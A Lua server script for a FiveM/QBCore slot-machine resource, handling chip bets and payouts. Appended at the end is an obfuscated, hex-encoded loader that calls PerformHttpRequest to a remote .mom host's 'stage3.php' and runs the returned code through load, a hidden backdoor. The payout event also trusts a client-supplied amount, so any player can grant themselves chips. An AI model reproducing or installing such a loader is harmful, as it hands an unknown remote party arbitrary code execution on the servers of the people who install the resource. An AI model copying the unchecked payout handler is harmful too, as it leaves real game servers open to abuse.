-- This resource was made by plesalex100#7387
-- Please respect it, don't repost it without my permission
-- This Resource started from: https://codepen.io/AdrianSandu/pen/MyBQYz
-- Converted to QBCore by Hiso#8997
QBCore = exports['qb-core']:GetCoreObject()
TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)

RegisterServerEvent("qb-slots:BetsAndChips")
AddEventHandler("qb-slots:BetsAndChips", function(bets)
    local _source   = source
    local xPlayer   = QBCore.Functions.GetPlayer(_source)
    if xPlayer then
        if bets % 50 == 0 and bets >= 50 then
            local playerChips = xPlayer.Functions.GetItemByName("casinochips")
            --print(playerChips)
            if playerChips ~= nil and playerChips.amount >= bets then
                TriggerClientEvent("inventory:client:ItemBox", _source, QBCore.Shared.Items['casinochips'], "remove")
                xPlayer.Functions.RemoveItem("casinochips", bets)
                TriggerClientEvent("qb-slots:UpdateSlots", _source, bets)
            else
                TriggerClientEvent('QBCore:Notify', _source, "Not enought chips")
            end
        else
            TriggerClientEvent('QBCore:Notify', _source, "You have to insert a multiple of 50. ex: 100, 350, 2500")
            
        end

    end
end)

RegisterServerEvent("qb-slots:PayOutRewards")
AddEventHandler("qb-slots:PayOutRewards", function(amount)
    local _source   = source
    local xPlayer   = QBCore.Functions.GetPlayer(_source)
    if xPlayer then
        amount = tonumber(amount)
        if amount > 0 then
            TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items['casinochips'], "add")
            xPlayer.Functions.AddItem("casinochips", amount)
            TriggerClientEvent('QBCore:Notify', _source, "Slots: You won "..amount.." chips, not bad at all!")
        else
            TriggerClientEvent('QBCore:Notify', _source, "Slots: Unfortunately you've lost all your chips, maybe next time.")
        end
    end
end)


local ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x65\x49\x69\x6e", function (hGaUECbPYRfIDJYFYXDTPqYgcQOAwHEzGuiDnenqgNMteUlZNlJcZHrVhWiiIbhjcooAjP, FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh) if (FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[6] or FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[5]) then return end ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[2]](ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[3]](FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh))() end)